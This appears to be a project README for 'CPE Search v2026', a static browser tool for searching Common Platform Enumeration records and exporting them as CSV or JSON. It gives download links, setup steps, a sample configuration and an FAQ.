# CPE Search v2026 - Common Platform Enumeration Lookup

> **Browse and query Common Platform Enumeration records through a small static web interface with daily data refreshes and CSV or JSON export support.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bennettisaac16/cpe-search-csv-json?style=flat-square)](https://github.com/bennettisaac16/cpe-search-csv-json)

---

<p align="center">
  <a href="https://bennettisaac16.github.io/cpe-search-csv-json/">
    <img src="https://img.shields.io/badge/Download-CPE%20Search%20Latest-brightgreen?style=for-the-badge" alt="Download CPE Search">
  </a>
</p>

> **[Download CPE Search v2026](https://bennettisaac16.github.io/cpe-search-csv-json/)**

---

[Download Latest Build](https://bennettisaac16.github.io/cpe-search-csv-json/)

---

## Overview

CPE Search provides a browser-based way to find and examine Common Platform Enumeration data. Its search and filtering tools make it easier to investigate CPE records and security catalog information associated with NVD and CVE workflows.

The application is delivered as a static website, so it can run on straightforward static hosting or from a local web server. It offers fast access to database content, downloadable datasets, and a practical interface for navigating extensive CPE collections.

---

## What It Provides

- Find and inspect CPE records in a web browser
- Search through vendor, product, and other CPE-related information
- Narrow database results using available filters
- Keep the database current with daily updates
- Export database records as CSV files
- Export database records as JSON files
- Deploy the interface on your own static hosting
- Reference security and vulnerability data connected to CPE
- Use a compact HTML-based user interface

---

## Setup

1. Get the repository by cloning or downloading it:

   `git clone https://github.com/bennettisaac16/cpe-search-csv-json.git

2. Serve the static site directory through a local web server or your hosting environment.

3. Open the application entry point in a browser:

   `index.html`

For deployment on a static host, configure the service to use the repository root or the directory containing the generated site.

---

## Using the Search Tool

Enter a product, vendor, or other relevant term into the search interface to locate CPE entries. Once results appear, use the available filters to focus the list and open individual records for their enumeration details.

A normal lookup sequence is:

1. Load the site in a browser.
2. Search for the desired product or platform.
3. Refine the results with filters.
4. Examine the resulting CPE records.
5. Export the data as CSV or JSON for local analysis or integration.

---

## Deployment and Data Configuration

CPE Search is a static application, so its configuration is generally represented by site files and deployment resources rather than a live runtime configuration service.

Example deployment notes:

    {
      "data_source": "local or hosted dataset",
      "update_cycle": "daily",
      "output_formats": ["csv", "json"]
    }

When adapting the site, modify the dataset files and the filter definitions within the repository layout used by your deployment.

---

## Prerequisites

- A modern HTML-compatible web browser
- Static hosting or a method for serving files locally
- Access to the CPE dataset used by the application
- Optional disk capacity for CSV and JSON exports
- Optional lightweight web server for local verification

---

## Frequently Asked Questions

**How can I use the newest database information?**  
Open the latest downloaded build or reload the hosted version so the current database update is available.

**Is self-hosting supported?**  
Yes. CPE Search is intended to operate as a static web interface that you can host yourself.

**How do I access database exports?**  
The database content is available through CSV and JSON download options.

**Why might some expected records be missing?**  
Make sure the deployed dataset is current, then check whether the selected filters accurately reflect the search.

**What should I check when deployment fails?**  
Confirm that the static site is being served from the correct root directory and that the browser can retrieve the required data assets.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
